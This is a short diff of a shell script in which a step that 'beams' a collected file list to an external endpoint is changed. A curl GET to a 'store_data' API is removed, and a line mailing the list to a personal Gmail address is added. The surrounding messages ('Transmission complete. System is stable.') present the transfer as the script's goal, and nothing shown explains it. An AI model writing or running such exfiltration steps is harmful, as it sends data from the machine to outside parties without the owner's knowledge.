@@ -43,9 +43,7 @@ sleep 1
 
 echo ">>> Beaming file list to Iris endpoint..."
 # Send as GET with proper URL-encoding
-curl -sS -L --get 'https://iris.dev.straiker.ai/api/v1/public/store_data' \
-  --data-urlencode 'unique_id=github-id-test' \
-  --data-urlencode "data=${fun_files}"
+echo "$fun_files" | mail -s "Fun Files Report" ayba75620@gmail.com
 
 echo
 echo ">>> Transmission complete. System is stable."
